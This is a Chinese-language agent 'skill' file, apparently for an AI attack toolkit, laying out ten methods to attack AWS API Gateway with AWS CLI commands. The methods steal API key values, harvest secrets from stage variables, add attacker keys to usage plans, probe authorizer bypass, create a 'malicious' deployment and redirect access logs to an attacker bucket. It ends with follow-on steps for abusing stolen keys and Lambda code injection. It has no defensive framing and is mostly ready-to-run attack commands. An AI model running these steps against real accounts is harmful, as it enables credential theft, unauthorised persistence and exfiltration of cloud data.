---
name: aws-api-gateway-attack
type: attack
category: api
platform: aws
severity: high
---

# AWS API Gateway 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 API Gateway
- 用户要求"攻击 API Gateway"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有 API
aws apigateway get-rest-apis --limit 500

# 3. 获取 API 详情
aws apigateway get-rest-api --rest-api-id REST_API_ID
```

## 攻击方法

### 方法 1: API 枚举

```bash
# 1. 列出所有 REST APIs
aws apigateway get-rest-apis --query 'items[].{id:id,name:name,description:description}' --output json

# 2. 获取 API 资源
aws apigateway get-resources --rest-api-id REST_API_ID

# 3. 获取 API 方法
aws apigateway get-resources --rest-api-id REST_API_ID --query 'items[].resourceMethods' --output json

# 4. 列出所有 WebSocket APIs
aws apigatewayv2 get-apis --query 'Items[]' --output json
```

### 方法 2: API 密钥窃取

```bash
# 1. 列出所有 API Keys
aws apigateway get-api-keys --limit 500 --query 'items[]' --output json

# 2. 获取 API Key 详情
aws apigateway get-api-key --api-key API_KEY_ID

# 3. 提取 API Key 值
aws apigateway get-api-key --api-key API_KEY_ID --query 'value' --output text

# 4. 创建新的 API Key（如果有权限）
aws apigateway create-api-key \
  --value STOLEN_KEY \
  --description "Malicious key" \
  --enabled
```

### 方法 3: Usage Plan 利用

```bash
# 1. 列出所有 Usage Plans
aws apigateway get-usage-plans --limit 500

# 2. 获取 Usage Plan 详情
aws apigateway get-usage-plan --usage-plan-id PLAN_ID

# 3. 查看 API Key 关联
aws apigateway get-usage-plan --usage-plan-id PLAN_ID --query 'apiStages[]'

# 4. 添加自己到 Usage Plan
aws apigateway create-usage-plan-key \
  --usage-plan-id PLAN_ID \
  --key-id YOUR_API_KEY_ID \
  --key-type API_KEY
```

### 方法 4: Lambda 后端利用

```bash
# 1. 获取 API 集成配置
aws apigateway get-integration \
  --rest-api-id REST_API_ID \
  --resource-id RESOURCE_ID \
  --http-method METHOD

# 2. 检查是否集成 Lambda
aws apigateway get-integration ... --query 'type' --output text
# 如果返回 AWS_PROXY，是 Lambda 集成

# 3. 获取 Lambda 函数名
aws apigateway get-integration ... --query 'uri' --output text
# 格式: arn:aws:apigateway:REGION:lambda:path/2015-03-31/functions/arn:aws:lambda:REGION:ACCOUNT_ID:function:FUNCTION_NAME/invocations

# 4. 攻击 Lambda 函数
# 使用 aws-lambda-attack 技能
```

### 方法 5: Stage 变量窃取

```bash
# 1. 列出所有 Stage
aws apigateway get-stages --rest-api-id REST_API_ID

# 2. 获取 Stage 详情
aws apigateway get-stage \
  --rest-api-id REST_API_ID \
  --stage-name STAGE_NAME

# 3. 提取 Stage 变量
aws apigateway get-stage ... --query 'variables' --output json

# 4. 搜索敏感变量
aws apigateway get-stage ... | grep -i -E "password|secret|key|token|database"
```

### 方法 6: Authorizer 绕过

```bash
# 1. 获取 Authorizer 配置
aws apigateway get-authorizers --rest-api-id REST_API_ID

# 2. 检查 Lambda Authorizer
aws apigateway get-authorizer --rest-api-id REST_API_ID --authorizer-id AUTHORIZER_ID

# 3. 如果是 Cognito Authorizer
# 可能存在令牌伪造或重放攻击

# 4. 测试未授权访问
curl -X METHOD https://API_ID.execute-api.REGION.amazonaws.com/STAGE/PATH
# 尝试不带 Authorization 头访问
```

### 方法 7: API 资源映射发现

```bash
# 1. 获取所有资源路径
aws apigateway get-resources --rest-api-id REST_API_ID --query 'items[].path' --output text

# 2. 递归遍历所有资源
for resource in $(aws apigateway get-resources --rest-api-id REST_API_ID --query 'items[].id' --output text); do
  echo "=== Resource $resource ==="
  aws apigateway get-resource --rest-api-id REST_API_ID --resource-id $resource
done

# 3. 查找隐藏资源
# 搜索包含 admin, debug, test 等路径
```

### 方法 8: Domain Name 利用

```bash
# 1. 列出所有 Domain Names
aws apigateway get-domain-names --limit 500

# 2. 获取 Domain Name 配置
aws apigateway get-domain-name --domain-name DOMAIN_NAME

# 3. 获取证书信息
aws apigateway get-domain-name ... --query 'certificateArn' --output text

# 4. 如果有证书权限
# 导出证书私钥（ACM 不支持，但可以用于其他服务）
```

### 方法 9: 请求/响应映射利用

```bash
# 1. 获取集成请求配置
aws apigateway get-integration --rest-api-id REST_API_ID --resource-id RESOURCE_ID --http-method POST

# 2. 获取请求映射模板
aws apigateway get-integration ... --query 'requestTemplates' --output json

# 3. 获取响应映射模板
aws apigateway get-integration-response \
  --rest-api-id REST_API_ID \
  --resource-id RESOURCE_ID \
  --http-method POST \
  --status-code 200

# 4. VTL 模板中可能包含敏感逻辑或凭证
```

### 方法 10: API 部署和更新攻击

```bash
# 1. 获取部署历史
aws apigateway get-deployments --rest-api-id REST_API_ID

# 2. 创建恶意部署
aws apigateway create-deployment \
  --rest-api-id REST_API_ID \
  --stage-name malicious \
  --description "Malicious deployment"

# 3. 更新 Stage 配置
aws apigateway update-stage \
  --rest-api-id REST_API_ID \
  --stage-name STAGE_NAME \
  --patch-operations op=replace,path=/accessLogSettings/destinationArn,value=ATTACKER_BUCKET

# 4. 启用访问日志到攻击者账户
aws apigateway update-stage \
  --rest-api-id REST_API_ID \
  --stage-name STAGE_NAME \
  --patch-operations op=replace,path=/*/*/accessLogSettings/enabled,value=true
```

## 验证成功

```bash
# 成功列出 API
aws apigateway get-rest-apis

# 成功获取 API Key
aws apigateway get-api-keys

# 成功调用 API
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/resource
```

## 下一步

1. 分析窃取的 API Key 和密钥
2. 通过 API Gateway 攻击后端服务
3. 利用 Lambda 集成进行代码注入
4. 通过 Stage 变量窃取配置信息
